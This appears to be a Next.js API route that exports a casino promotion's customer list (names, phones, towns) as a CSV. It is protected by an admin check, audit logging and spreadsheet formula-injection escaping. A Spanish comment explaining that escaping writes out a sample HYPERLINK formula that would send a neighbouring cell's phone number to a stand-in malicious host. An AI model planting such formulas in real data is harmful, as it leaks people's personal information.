import { NextResponse } from 'next/server';
import { sql } from '@/lib/db';
import { esAdmin } from '@/lib/admin-auth';
import { formatPhone } from '@/lib/phone';
import { hoyEnPR } from '@/lib/hora-pr';
import { getClientIp } from '@/lib/session';
import { conPlazo } from '@/lib/plazo-ruta';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';
// Techo de la función: por defecto Vercel deja llegar a 300 s, y ahí es donde
// se quedaron colgadas las peticiones en producción.
export const maxDuration = 15;

/*
 * El plazo de estas rutas. Escriben en la base, así que NO se reintentan:
 * cuando un guardado no contesta no se sabe si llegó, y repetirlo a ciegas
 * es apostar. Ver src/lib/plazo-ruta.ts.
 */
export const GET = conPlazo('exportar la lista de clientes', manejarGet);

/**
 * Exportación de la lista de clientes para mercadeo.
 *
 * Se sirve con BOM UTF-8 porque Excel en Windows, sin él, abre el CSV en la
 * codificación local y convierte "Manatí" en "ManatÃ­" — que es exactamente el
 * archivo que el personal va a abrir.
 */
async function manejarGet() {
  if (!(await esAdmin())) {
    return NextResponse.json({ ok: false }, { status: 401 });
  }

  const filas = await sql<
    {
      full_name: string;
      phone_e164: string;
      municipality: string;
      created_at: string;
      tiradas: number;
      premios: number;
    }[]
  >`
    -- La fecha de registro se convierte A HORA DE PUERTO RICO en la base, no
    -- en JavaScript. Salía de un toISOString(), que es UTC: quien abrió su
    -- cuenta un sábado a las 9 de la noche aparecía en la lista como del
    -- domingo. app.gaming_date es la misma función con la que se decide de qué
    -- día es una tirada, así que la lista y el sorteo cuentan los días igual.
    select p.full_name, p.phone_e164, m.name as municipality,
           app.gaming_date(p.created_at)::text as created_at,
           (select count(*)::int from app.spins s where s.player_id = p.id) as tiradas,
           (select count(*)::int from app.wins  w where w.player_id = p.id) as premios
      from app.players p
      join app.municipalities m on m.id = p.municipality_id
     where p.blocked_at is null
     order by p.created_at desc
  `;

  // Excel, LibreOffice y Google Sheets evalúan como FÓRMULA cualquier celda que
  // empiece por = + - @ o por tabulador/retorno. Las comillas del CSV no lo
  // impiden: son del formato, no del contenido — el programa las quita al
  // parsear y evalúa lo que queda.
  //
  // El nombre lo escribe el público en el formulario de registro, y este archivo
  // lo abre el personal en Excel. Sin esto, alguien se registra como
  // `=HYPERLINK("http://sitio-malo/?d="&B2,"Cobrar aquí")` y la lista de
  // clientes le entrega el celular de la fila de al lado al primer clic.
  //
  // El apóstrofo delante es la neutralización estándar: la hoja de cálculo lo
  // trata como "esto es texto". Ningún nombre real empieza por esos caracteres,
  // así que ninguna fila legítima se ve alterada.
  //
  // Se prueba sobre el valor sin espacios delante a propósito. El registro ya
  // rechaza estos nombres, pero esta función también tiene que proteger filas
  // que se guardaran ANTES de esa regla, y ahí puede haber un " =1+1" con
  // espacio. No está claro que toda hoja de cálculo lo ignore, y averiguarlo
  // caso por caso cuesta más que cubrir los dos.
  const FORMULA = /^[=+\-@\t\r]/;
  const escapar = (v: string) => {
    const s = String(v);
    return `"${(FORMULA.test(s.trimStart()) ? `'${s}` : s).replace(/"/g, '""')}"`;
  };

  const lineas = [
    ['Nombre', 'Celular', 'Pueblo', 'Registrado', 'Tiradas', 'Premios'].join(','),
    ...filas.map((f) =>
      [
        escapar(f.full_name),
        escapar(formatPhone(f.phone_e164)),
        escapar(f.municipality),
        escapar(f.created_at),
        f.tiradas,
        f.premios,
      ].join(','),
    ),
  ];

  // QUEDA CONSTANCIA DE QUE ALGUIEN SE LLEVÓ LA LISTA.
  //
  // Este archivo es lo más sensible que produce el sitio: el nombre, el pueblo
  // y el CELULAR de todos los clientes, en un archivo que sale del sistema y ya
  // no se puede controlar. Descargarlo es legítimo —es para mercadeo— pero
  // tiene que dejar rastro, porque el día que esa lista aparezca donde no debe,
  // la primera pregunta va a ser cuándo salió y cuántas filas iban.
  //
  // Se guarda en `risk_events`, que es donde ya viven los intentos de entrada
  // fallidos. No se guarda QUIÉN lo hizo porque hoy no se puede saber: el panel
  // tiene una sola contraseña para todo el personal. Esa es la razón principal
  // para pasar a cuentas por empleado.
  //
  // Si el registro falla no se cancela la descarga: la lista es el trabajo y el
  // apunte es la contabilidad. Se anota el fallo y se sigue.
  await sql`
    insert into app.risk_events (ip_inet, kind, score, detail)
    values (${await getClientIp()}::inet, 'export_clientes', 0,
            ${sql.json({ filas: filas.length })})
  `.catch((e) => console.error('[auditoría] no se pudo anotar la exportación', e));

  const fecha = hoyEnPR();

  return new NextResponse('﻿' + lineas.join('\r\n'), {
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="clientes-casino-atlantico-${fecha}.csv"`,
      'cache-control': 'no-store',
    },
  });
}
